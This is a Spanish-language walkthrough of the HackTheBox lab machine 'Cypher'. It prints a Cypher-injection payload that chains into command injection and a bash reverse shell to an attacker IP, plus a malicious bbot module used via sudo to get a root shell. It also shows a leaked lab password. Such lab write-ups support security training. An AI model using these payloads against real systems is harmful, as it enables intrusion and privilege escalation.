---
title: Cypher - Medium (HTB)
permalink: /Cypher-HTB-Writeup/
tags: 
  - "Linux"
  - "Medium"
  - "Reversing"
  - "CRF"
  - "Java"
  - "Cypher Injection"
  - "Command Injection"
  - "Credentials Leakage"
  - "Bbot"
  - "Sudoers"
categories:
  - writeup
  - hacking
  - hackthebox
toc: true
toc_label: Topics
toc_sticky: true
sidebar:
  - main
seo_tittle: Cypher - Medium (HTB)
seo_description: Practica Cypher Injection y abusa de privilegios a nivel de Sudoers para vencer Cypher.
excerpt: Practica Cypher Injection y abusa de privilegios a nivel de Sudoers para vencer Cypher.
header:
  overlay_image: /assets/images/headers/cypher-hackthebox.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/cypher-hackthebox.jpg
---


![image-center](/assets/images/posts/cypher-hackthebox.png)
{: .align-center}

**Habilidades:** Reversing `.jar` File (CFR), Cypher Injection + Command Injection, Credentials Leakage, Abusing `bbot` - Sudoers Privilege
{: .notice--primary}

# Introducción

Cypher es una máquina Linux de dificultad `Medium` en HackTheBox que requiere analizar código Java al realizar un proceso de Reversing a un archivo `.jar`, inyección Cypher, inyección de comandos en una función personalizada de Cypher para acceso inicial. Abusaremos de privilegios `sudo` sobre el binario `Bbot` para obtener control total y vencer Cypher. 
<br>
# Reconocimiento
---
Enviaremos una traza ICMP para comprobar que la máquina víctima se encuentre activa

~~~ bash
ping -c1 10.10.11.57 
PING 10.10.11.57 (10.10.11.57) 56(84) bytes of data.
64 bytes from 10.10.11.57: icmp_seq=1 ttl=63 time=223 ms

--- 10.10.11.57 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 223.196/223.196/223.196/0.000 ms
~~~


## Nmap Scanning 

Realizaremos un escaneo de puertos a través del protocolo TCP con el fin de identificar puertos abiertos

~~~ bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.57 -oG openPorts 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-08 12:40 EDT
Nmap scan report for 10.10.11.57
Host is up (0.37s latency).
Not shown: 43148 filtered tcp ports (no-response), 22385 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 28.72 seconds
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grepable`
- `-v`: Ver el progreso del escaneo

Haremos un segundo escaneo de los puertos que hemos descubierto para identificar la versión y los servicios que se ejecutan en cada puerto

~~~ bash
nmap -p 22,80 -sVC 10.10.11.57 -oN services                       
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-08 12:49 EDT
Nmap scan report for 10.10.11.57
Host is up (0.23s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 be:68:db:82:8e:63:32:45:54:46:b7:08:7b:3b:52:b0 (ECDSA)
|_  256 e5:5b:34:f5:54:43:93:f8:7e:b6:69:4c:ac:d6:3d:23 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cypher.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.64 seconds
~~~

- `-p`: Especificar puertos
- `-sV`: Identificar la versión del servicio 
- `-sC`: Uso de scripts de reconocimiento
- `-oN`: Exportar la salida en formato normal

Vemos dos servicios expuestos, `ssh` y `http`. Para el servicio web, vemos que el servidor nos intenta redirigir al nombre de dominio `cypher.htb`, contemplaremos esto en nuestro archivo DNS local

~~~ bash
cat /etc/hosts | grep cypher.htb  

10.10.11.57 cypher.htb
~~~


## Web Analysis

Antes de visitar la web podemos ejecutar un escaneo de tecnologías web que el servidor utilice para servir el contenido

~~~ bash
whatweb http://cypher.htb  

http://cypher.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.10.11.57], JQuery[3.6.1], Script, Title[GRAPH ASM], nginx[1.24.0]
~~~

Al navegar hasta `cypher.htb`, veremos la siguiente web

![image-center](/assets/images/posts/cypher-web-analysis.png)
{: .align-center}

Hay diversas pestañas en la barra superior, primero iremos a `Login`, veremos ls siguiente web donde podremos iniciar sesión. Ocurre un error si intentamos causar un error enviando `'` en algún campo

![image-center](/assets/images/posts/cypher-web-analysis-2.png)
{: .align-center}

Este error señala un error de `python`, podemos apreciar que se intenta ejecutar una función `run_cypher`. Más abajo por la línea `20` del error podremos ver la consulta que se intenta hacer, se trata de sintaxis de `Cypher`

~~~ cypher
neo4j.exceptions.CypherSyntaxError: {code: Neo.ClientError.Statement.SyntaxError} {message: Failed to parse string literal. The query must contain an even number of non-escaped quotes. (line 1, column 59 (offset: 58))
"MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = 'test'' return h.value as hash"
~~~


## Understanding Cypher

> Cypher es un **lenguaje de consulta declarativo diseñado para trabajar con bases de datos de grafos**, como [Neo4j](https://translate.google.com/translate?u=https://neo4j.com/product/cypher-graph-query-language/&hl=es&sl=en&tl=es&client=sge). Similar a SQL para bases de datos relacionales, Cypher permite a los usuarios consultar, manipular y administrar datos dentro de una base de datos de grafos
{: .notice--info}

Una base de datos de grafos es un **sistema de gestión de datos** que utiliza la **teoría de grafos para representar y almacenar datos**, enfocándose en las relaciones entre ellos. 

En lugar de tablas como en las bases de datos relacionales, utiliza **nodos** (vértices) y **aristas** (relaciones) para representar entidades y sus conexiones

![image-center](/assets/images/posts/cypher-cypher-database.png)
{: .align-center}


## Fuzzing

Intentaremos descubrir rutas que no veamos en la web enviando solicitudes HTTP en base a un diccionario de rutas. Veremos algunas como `/demo`, `/api` y `/testing`

~~~ bash
gobuster dir -u http://cypher.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cypher.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 4562]
/about                (Status: 200) [Size: 4986]
/login                (Status: 200) [Size: 3671]
/demo                 (Status: 307) [Size: 0] [--> /login]
/api                  (Status: 307) [Size: 0] [--> /api/docs]
/testing              (Status: 301) [Size: 178] [--> http://cypher.htb/testing/]
~~~

Al realizar una solicitud a `/api`, obtendremos el siguiente mensaje

~~~ bash
curl -L http://cypher.htb/api
{"detail":"Not Found"}#
~~~


## Directory Listing

En `/testing`, veremos cómo se listan los archivos que contiene este directorio. Existe un archivo `.jar` que podemos descargar

![image-center](/assets/images/posts/cypher-directory-listing.png)
{: .align-center}

Nos ubicaremos en nuestro directorio de trabajo para descargar el archivo allí

~~~ bash
wget http://cypher.htb/testing/custom-apoc-extension-1.0-SNAPSHOT.jar
~~~


## Reversing - `.jar` File Analysis

Haremos un proceso de análisis a este archivo `.jar`, podemos utilizar herramientas de `reversing` para descompilar el código `java` y así verlo en texto claro.

> APOC (Awesome Procedures on Cypher) es una biblioteca de procedimientos y funciones definidos por el usuario para Neo4j que amplía su funcionalidad.
{: .notice--info}

En mi caso he utilizado la herramienta [`crf`](https://www.benf.org/other/cfr/cfr-0.152.jar), una utilidad que nos permite descompilar archivos `.jar`, nombré la carpeta de destino `decompiled` (no importa el nombre)

~~~ bash
java -jar cfr-0.152.jar custom-apoc-extension-1.0-SNAPSHOT.jar --outputdir decompiled 
Processing custom-apoc-extension-1.0-SNAPSHOT.jar (use silent to silence)
Processing com.cypher.neo4j.apoc.HelloWorldProcedure
Processing com.cypher.neo4j.apoc.CustomFunctions
~~~

Podemos consultar rápidamente el código de la clase `CustomFunctions`

~~~ java
/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.neo4j.procedure.Description
 *  org.neo4j.procedure.Mode
 *  org.neo4j.procedure.Name
 *  org.neo4j.procedure.Procedure
 */
package com.cypher.neo4j.apoc;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.Arrays;
import java.util.concurrent.TimeUnit;
import java.util.stream.Stream;
import org.neo4j.procedure.Description;
import org.neo4j.procedure.Mode;
import org.neo4j.procedure.Name;
import org.neo4j.procedure.Procedure;

public class CustomFunctions {
    @Procedure(name="custom.getUrlStatusCode", mode=Mode.READ)
    @Description(value="Returns the HTTP status code for the given URL as a string")
    public Stream<StringOutput> getUrlStatusCode(@Name(value="url") String url) throws Exception {
        String line;
        if (!((String)url).toLowerCase().startsWith("http://") && !((String)url).toLowerCase().startsWith("https://")) {
            url = "https://" + (String)url;
        }
        Object[] command = new String[]{"/bin/sh", "-c", "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} " + (String)url};
        System.out.println("Command: " + Arrays.toString(command));
        Process process = Runtime.getRuntime().exec((String[])command);
        BufferedReader inputReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
        StringBuilder errorOutput = new StringBuilder();
        while ((line = errorReader.readLine()) != null) {
            errorOutput.append(line).append("\n");
        }
        String statusCode = inputReader.readLine();
        System.out.println("Status code: " + statusCode);
        boolean exited = process.waitFor(10L, TimeUnit.SECONDS);
        if (!exited) {
            process.destroyForcibly();
            statusCode = "0";
            System.err.println("Process timed out after 10 seconds");
        } else {
            int exitCode = process.exitValue();
            if (exitCode != 0) {
                statusCode = "0";
                System.err.println("Process exited with code " + exitCode);
            }
        }
        if (errorOutput.length() > 0) {
            System.err.println("Error output:\n" + errorOutput.toString());
        }
        return Stream.of(new StringOutput(statusCode));
    }

    public static class StringOutput {
        public String statusCode;

        public StringOutput(String statusCode) {
            this.statusCode = statusCode;
        }
    }
}
~~~

El parámetro `url` no se sanitiza, se envía directamente dentro de un comando que será ejecutado, esto puede ser una vía potencial para inyectar comandos dentro de esta función

~~~ java
Object[] command = new String[]{"/bin/sh", "-c", "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} " + (String)url};
~~~

Además sabemos que la función se registra como un procedimiento almacenado para ser utilizado dentro de `Neo4j`

~~~ java
@Procedure(name="custom.getUrlStatusCode", mode=Mode.READ)
    @Description(value="Returns the HTTP status code for the given URL as a string")
~~~
<br>


# Intrusión / Explotación
---
## Cypher Injection + Command Injection

Sabiendo que las consultas se realizan en el lenguaje `Cypher`, intentaremos inyectar una query maliciosa. Te dejo una guía de [`Cypher Injection`](https://pentester.land/blog/cypher-injection-cheatsheet/). Además utilizaremos la función personalizada `custom.GetUrlStatusCode()` para intentar inyectar un comando dentro de ésta.

A modo de prueba de concepto, enviaremos un `ping` a nuestra máquina atacante: 
- Llamaremos a la función `getUrlStatusCode()` utilizando la palabra `CALL`.
- `YIELD statusCode RETURN statusCode` asegura que la consulta sea válida y retorna el valor que la función retorna 
- Cerraremos la consulta con `//` para comentar el resto y evitar errores de sintaxis

~~~ cypher
' OR 1=1 CALL custom.getUrlStatusCode("x.com; ping -c1 10.10.14.187") YIELD statusCode RETURN statusCode //
~~~

Iniciaremos una captura de tráfico ICMP para detectar si estamos recibiendo la traza desde la máquina víctima. 

~~~ bash
tcpdump -i tun0 icmp
~~~

Cuando enviemos la query `cypher` en el formulario de Login, desde `tcpdump` veremos cómo el servidor nos envía un `ping`

~~~ bash
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
14:15:31.340812 IP cypher.htb > 10.10.14.187: ICMP echo request, id 39913, seq 1, length 64
14:15:31.340835 IP 10.10.14.187 > cypher.htb: ICMP echo reply, id 39913, seq 1, length 64
~~~

### Exploiting

Modificaremos el `payload` para ejecutar la siguiente reverse shell en `bash`, podemos enviarla directamente como parámetro en la función `getUrlStatusCode()`

~~~ cypher
' OR 1=1 CALL custom.getUrlStatusCode("x.com; bash -c 'bash -i >& /dev/tcp/10.10.14.187/443 0>&1'") YIELD statusCode RETURN statusCode //
~~~

> Antes de ejecutar la reverse shell asegúrate de haber iniciado un listener por el puerto por el cual estás enviando la reverse shell, por ejemplo: `nc -lvnp 443`
{: .notice--warning}

![image-center](/assets/images/posts/cypher-cypher-injection.png)
{: .align-center}

Desde nuestro listener recibiremos correctamente una consola como el usuario `neo4j`

~~~ bash
nc -lvnp 443 
listening on [any] 443 ...
connect to [10.10.14.187] from (UNKNOWN) [10.10.11.57] 57654
bash: cannot set terminal process group (1433): Inappropriate ioctl for device
bash: no job control in this shell
neo4j@cypher:/$   
~~~


## TTY Treatment

Haremos un tratamiento de la TTY para obtener una consola más interactiva y que no se nos vaya al carajo la shell al hacer `Ctrl + C`

~~~ bash
neo4j@cypher:/$ script /dev/null -c bash  
script /dev/null -c bash
Script started, output log file is '/dev/null'.
neo4j@cypher:/$ ^Z
[1]  + 84765 suspended  nc -lvnp 443
root@parrot exploits # stty raw -echo; fg                            
[1]  + 84765 continued  nc -lvnp 443
                                    reset xterm
~~~

Cambiaremos el valor de la variable de entorno `TERM` a `xterm` para poder hacer `Ctrl + L`. Además, ajustaremos las proporciones de la terminal a las que tengamos, puedes verlas en tu máquina con el comando `stty size`

~~~ bash
neo4j@cypher:/$ export TERM=xterm
neo4j@cypher:/$ stty rows 44 columns 184
~~~


## Finding Lateral Movement Path

En este punto debemos buscar una forma de escalar nuestros privilegios o convertirnos en otro usuario que tenga más privilegios que el usuario actual

### Users

Buscando nombres de usuario en el archivo `/etc/passwd`, veremos que existe el usuario `graphasm`

~~~ bash
neo4j@cypher:/$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
graphasm:x:1000:1000:graphasm:/home/graphasm:/bin/bash
neo4j:x:110:111:neo4j,,,:/var/lib/neo4j:/bin/bash
~~~

### (Posible) SUID Binaries

Podemos buscar binarios `SUID` que permitan ejecutarlos como otro usuario (no necesariamente `root`) y así poder convertirnos en el propietario

~~~ bash
neo4j@cypher:/$ find / -perm -4000 2>/dev/null
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/mount
/usr/bin/sudo
/usr/bin/su
/usr/bin/umount
/usr/bin/fusermount3
/usr/lib/openssh/ssh-keysign
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
~~~


## Interesting Files

Dentro del directorio `/home`, veremos un archivo `.yml` el cual tenemos permisos de lectura, debido a que se permite a otros usuarios inspeccionar el archivo

~~~ bash
neo4j@cypher:/$ find /home -type f 2>/dev/null | xargs ls -l
-rw-r--r-- 1 graphasm graphasm  220 Mar 31  2024 /home/graphasm/.bash_logout
-rw-r--r-- 1 graphasm graphasm 3771 Mar 31  2024 /home/graphasm/.bashrc
-rw-r--r-- 1 graphasm graphasm  156 Feb 14 12:35 /home/graphasm/bbot_preset.yml
-rw-r--r-- 1 graphasm graphasm  807 Mar 31  2024 /home/graphasm/.profile
-rw-r----- 1 root     graphasm   33 Jul 10 04:05 /home/graphasm/user.txt
~~~


## Credentials Leakage

Si vemos el contenido del archivo `bbot_preset.yml`, veremos unas credenciales para `neo4j`

~~~ bash
neo4j@cypher:/$ cat /home/graphasm/bbot_preset.yml 
targets:
  - ecorp.htb

output_dir: /home/graphasm/bbot_scans

config:
  modules:
    neo4j:
      username: neo4j
      password: cU4btyib.20xtCMCXkBmerhK
~~~


## Shell as `graphasm`

Esta contraseña nos permite autenticarnos como el usuario `graphasm`

~~~ bash
ssh graphasm@cypher.htb

graphasm@cypher.htb\'s password: 
Last login: Thu Jul 10 06:41:54 2025 from 10.10.14.187

graphasm@cypher:~$ export TERM=xterm
~~~

Ya podemos ver la flag del usuario sin privilegios

~~~ bash
graphasm@cypher:~$ cat user.txt 
5fa...
~~~
<br>


# Escalada de Privilegios
---
## Abusing `bbot` - Sudoers Privileges

Listando los privilegios configurados en `/etc/sudoers`, podemos ejecutar `bbot` como cualquier usuario (incluyendo `root`) sin proporcionar contraseña

~~~ bash
graphasm@cypher:~$ sudo -l
Matching Defaults entries for graphasm on cypher:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User graphasm may run the following commands on cypher:
    (ALL) NOPASSWD: /usr/local/bin/bbot
~~~

> BBOT, o "Bighuge BLS OSINT Tool", es un framework de automatización OSINT (Inteligencia de Fuentes Abiertas) de código abierto desarrollado por [Black Lantern Security](https://translate.google.com/translate?u=https://blog.blacklanternsecurity.com/p/bbot&hl=es&sl=en&tl=es&client=sge)
{: .notice--info}

Con los privilegios actuales, podemos [crear un módulo](https://www.blacklanternsecurity.com/bbot/Stable/dev/module_howto/) aparentemente inofensivo, que realmente ejecutará un comando en el sistema. Como podemos ejecutarlo emulando ser `root`, sería una vía potencial para escalar privilegios.

Existe un [repositorio](https://github.com/Housma/bbot-privesc/) que contempla un módulo malicioso que podemos utilizar como prueba de concepto, podemos clonarlo en nuestra máquina atacante-

~~~ bash
git clone https://github.com/Housma/bbot-privesc/
~~~

Iniciaremos un servidor HTTP en el directorio donde tenemos el repositorio

~~~ bash
python3 -m http.server 80
~~~

Crearemos un directorio en la ruta `/tmp` y descargaremos recursivamente los archivos necesarios para la escalada

~~~ bash
graphasm@cypher:~$ mkdir -p /tmp/privesc && wget -P /tmp/privesc http://10.10.14.187/bbot-privesc -r
~~~

Una vez se descargaron los archivos, nos dirigiremos al directorio que creamos en `/tmp`

~~~ bash
graphasm@cypher:~$ cd /tmp/privesc/10.10.14.187/
~~~

El archivo `.py` contiene el comando que se ejecutará en el sistema, debe contener el mismo nombre tanto en la clase como en el archivo `preset.yml`

~~~ python
from bbot.modules.base import BaseModule
import pty

class launch_shell(BaseModule):
    watched_events = []
    produced_events = []
    flags = ["safe", "passive"]
    meta = {"description": "Execute a interactive shell (root)"}

    async def setup(self):
        self.hugesuccess("Executing shell!")
        try:
            pty.spawn(["/bin/bash", "-p"])
        except Exception as e:
            self.error(f"Failed: {e}")
        return True
~~~

El archivo `preset.yml` luce más o menos de la siguiente manera

~~~ bash
description: System Info Recon Scan
module_dirs:
  - .
modules:
  - launch_shell
~~~

En este caso se ejecutará una `bash` como el usuario propietario del binario (que es `root`)


## Root Time

Ejecutaremos el siguiente comando para cargar el módulo falso y ejecutar 

~~~ bash
graphasm@cypher:/tmp/privesc/privesc$ sudo /usr/local/bin/bbot -t dummy.com -p ./preset.yml --event-types ROOT

  ______  _____   ____ _______
 |  ___ \|  __ \ / __ \__   __|
 | |___) | |__) | |  | | | |
 |  ___ <|  __ <| |  | | | |
 | |___) | |__) | |__| | | |
 |______/|_____/ \____/  |_|
 BIGHUGE BLS OSINT TOOL v2.1.0.4939rc

www.blacklanternsecurity.com/bbot

[INFO] Scan with 1 modules seeded with 1 targets (1 in whitelist)
[INFO] Loaded 1/1 scan modules (systeminfo_enum)
[INFO] Loaded 5/5 internal modules (aggregate,cloudcheck,dnsresolve,excavate,speculate)
[INFO] Loaded 5/5 output modules, (csv,json,python,stdout,txt)
[SUCC] systeminfo_enum: 📡 systeminfo_enum setup called — launching shell!
                                                                          root@cypher:/tmp/privesc/10.10.14.187# id
                                                                          uid=0(root) gid=0(root) groups=0(root)
~~~

Ya podremos ver la última flag del sistema ubicada en el directorio `/root`

~~~ bash
root@cypher:/tmp/privesc/10.10.14.187# cat /root/root.txt 
283...
~~~
<br>
Gracias por leer este artículo, espero te haya sido de ayuda. Te dejo la cita del día:

>  In a controversy the instant we feel anger we have already ceased striving for the truth, and have begun striving for ourselves.
> — Buddha
{: .notice--info}
